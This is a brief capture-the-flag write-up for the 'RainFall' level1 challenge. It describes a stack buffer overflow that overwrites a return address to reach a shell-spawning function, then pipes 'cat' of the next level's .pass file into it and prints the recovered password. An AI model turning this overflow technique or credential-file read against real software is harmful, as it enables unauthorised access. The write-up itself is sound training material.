# Rainfall01

On binary dissasembly this looks like a buffer overflow attack, buff size is 76

Upon inspection we can see a function that we're supposed to call on address 0x08048444

It seems that it's possible to write more than 76 and overflow and hopefully get somewhere

We generate some filler char and add the address of our target function

```sh
level1@RainFall:~$ python -c 'print((76 * "\x11") + "\x44\x84\x04\x08")' > /tmp/payload
level1@RainFall:~$ ./level1 < /tmp/payload
Good... Wait what?
Segmentation fault (core dumped)
```

Ok so that's nice but that's no flag
The code appears to try and run bash but crashes, let's try to input something

There is a first read when we inject our payload and after this one we should be using bash

```sh
level1@RainFall:~$ (python -c 'print((76 * "\x11") + "\x44\x84\x04\x08")'; echo "cat /home/user/level2/.pass") | ./level1
Good... Wait what?
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
Segmentation fault (core dumped
```

Bingo

